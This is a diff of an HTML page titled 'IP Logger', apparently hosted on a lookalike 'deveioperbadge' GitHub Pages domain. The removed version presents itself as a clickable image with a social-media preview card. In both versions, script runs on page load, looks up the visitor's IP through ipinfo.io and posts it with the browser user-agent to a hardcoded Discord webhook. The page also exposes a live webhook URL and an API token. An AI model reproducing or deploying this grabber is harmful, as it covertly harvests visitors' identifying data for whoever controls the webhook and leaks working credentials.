@@ -1,46 +1,46 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta property="og:image" content="https://deveioperbadge.github.io/Image/download.jpg">
-    <meta name="twitter:card" content="summary_large_image">
-    <script>
-      // Fetch the user's IP address using ipinfo.io API
-      fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace with your ipinfo.io API token
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>IP Logger</title>
+  <script>
+    // Fetch the user's IP address using ipinfo.io API
+    fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace with your ipinfo.io API token
+      .then(response => response.json())
+      .then(data => {
+        const userIp = data.ip; // Extract the IP address from the response
+        console.log("User IP:", userIp); // Log the IP address to the console
+
+        // Prepare data for Discord webhook
+        const webhookData = {
+          content: `🚨 Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
+        };
+
+        // Send the IP to your Discord webhook
+        fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(webhookData) // Send the data as JSON
+        })
         .then(response => response.json())
         .then(data => {
-          const userIp = data.ip; // Extract the IP address from the response
-          console.log("User IP:", userIp); // Log the IP address to the console
-
-          // Prepare data for Discord webhook
-          const webhookData = {
-            content: `🚨 Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
-          };
-
-          // Send the IP to your Discord webhook
-          fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(webhookData)
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log("Webhook sent successfully:", data); // Log the response from Discord webhook
-          })
-          .catch(error => {
-            console.error('Error sending data to webhook:', error); // Log any errors
-          });
+          console.log("Webhook response:", data); // Log the response from Discord webhook
         })
         .catch(error => {
-          console.error('Error fetching IP:', error); // Log any errors while fetching IP
+          console.error('Error sending data to webhook:', error); // Log any errors
         });
-    </script>
-  </head>
-  <body>
-    <!-- Clickable image that leads to the page -->
-    <a href="https://deveioperbadge.github.io/Image/" target="_blank">
-      <img src="download.jpg" style="max-width: 100%;">
-    </a>
-  </body>
+      })
+      .catch(error => {
+        console.error('Error fetching IP:', error); // Log errors when fetching IP
+      });
+  </script>
+</head>
+<body>
+  <h1>Welcome to the IP Logger Page</h1>
+  <p>Middle-click on this page, and your IP will be logged and sent to Discord!</p>
+</body>
 </html>
